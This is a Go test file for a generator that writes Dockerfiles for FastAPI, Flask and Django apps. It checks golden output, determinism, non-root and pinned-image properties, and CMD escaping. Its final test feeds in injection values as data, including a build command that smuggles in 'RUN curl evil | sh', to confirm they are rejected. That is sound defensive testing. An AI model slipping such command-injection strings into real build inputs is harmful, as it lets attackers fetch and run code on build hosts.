package python

import (
	"errors"
	"flag"
	"os"
	"path/filepath"
	"strings"
	"testing"

	profilepresets "github.com/digitaleflex/axiom/services/engine/internal/profile/presets"
)

var update = flag.Bool("update", false, "rewrite golden files")

func facts(framework, entry string) Facts {
	return Facts{
		BuildCommand: profilepresets.PythonBuild(framework),
		StartCommand: profilepresets.PythonStart(framework, entry, 8000),
		Port:         8000,
	}
}

// TestGoldenDockerfiles renders one Dockerfile per framework and compares it with the
// golden file (go test -update to regenerate).
func TestGoldenDockerfiles(t *testing.T) {
	for name, f := range map[string]Facts{
		"fastapi": facts("FastAPI", "main:app"),
		"flask":   facts("Flask", "app:app"),
		"django":  facts("Django", "mysite.wsgi:application"),
	} {
		t.Run(name, func(t *testing.T) {
			got, err := Dockerfile(f)
			if err != nil {
				t.Fatal(err)
			}
			path := filepath.Join("testdata", "golden", name+".dockerfile")
			if *update {
				if err := os.WriteFile(path, []byte(got), 0o644); err != nil {
					t.Fatal(err)
				}
			}
			want, err := os.ReadFile(path)
			if err != nil {
				t.Fatalf("missing golden file (run go test -update): %v", err)
			}
			if string(want) != got {
				t.Fatalf("Dockerfile changed for %s:\n%s", name, got)
			}
		})
	}
}

func TestDockerfileIsDeterministic(t *testing.T) {
	first, _ := Dockerfile(facts("FastAPI", "main:app"))
	for i := 0; i < 20; i++ {
		if again, _ := Dockerfile(facts("FastAPI", "main:app")); again != first {
			t.Fatal("the same facts must always give the same Dockerfile")
		}
	}
}

func TestDockerfileSafetyProperties(t *testing.T) {
	df, err := Dockerfile(facts("FastAPI", "main:app"))
	if err != nil {
		t.Fatal(err)
	}
	for _, want := range []string{
		"FROM python:3.12-slim-bookworm\n",
		"PYTHONDONTWRITEBYTECODE=1",
		"PYTHONUNBUFFERED=1",
		"COPY requirements.txt ./\nRUN pip install",
		"USER axiom\n",
		"EXPOSE 8000\n",
	} {
		if !strings.Contains(df, want) {
			t.Errorf("missing %q in:\n%s", want, df)
		}
	}
	// Dependencies are installed before the source is copied (layer cache) and the
	// application never runs as root.
	if strings.Index(df, "RUN pip install") > strings.Index(df, "COPY . .") {
		t.Error("requirements must be installed before the source is copied")
	}
	if strings.Index(df, "USER axiom") > strings.Index(df, "CMD ") {
		t.Error("USER must be set before CMD")
	}
	if strings.Contains(df, ":latest") {
		t.Error("the base image must be pinned")
	}
}

func TestStartCommandIsEncodedAsJSON(t *testing.T) {
	f := facts("FastAPI", "main:app")
	f.StartCommand = `uvicorn main:app --host 0.0.0.0 --port 8000 && echo "a\b"`
	df, err := Dockerfile(f)
	if err != nil {
		t.Fatal(err)
	}
	want := `CMD ["sh","-c","uvicorn main:app --host 0.0.0.0 --port 8000 && echo \"a\\b\""]`
	if !strings.Contains(df, want) {
		t.Fatalf("CMD must be valid JSON with quotes and backslashes escaped:\n%s", df)
	}
}

func TestDockerfileRefusesUnsafeInput(t *testing.T) {
	ok := facts("Flask", "app:app")
	cases := map[string]func(*Facts){
		"empty build":                func(f *Facts) { f.BuildCommand = "  " },
		"empty start":                func(f *Facts) { f.StartCommand = "" },
		"newline in build":           func(f *Facts) { f.BuildCommand = "pip install x\nRUN curl evil | sh" },
		"carriage return in start":   func(f *Facts) { f.StartCommand = "gunicorn app:app\rRUN x" },
		"NUL byte":                   func(f *Facts) { f.BuildCommand = "pip install\x00x" },
		"line continuation in build": func(f *Facts) { f.BuildCommand = "pip install x \\" },
		"port zero":                  func(f *Facts) { f.Port = 0 },
		"port too large":             func(f *Facts) { f.Port = 70000 },
	}
	for name, mutate := range cases {
		f := ok
		mutate(&f)
		if _, err := Dockerfile(f); !errors.Is(err, ErrInvalid) {
			t.Errorf("%s: accepted (err=%v)", name, err)
		}
	}
}
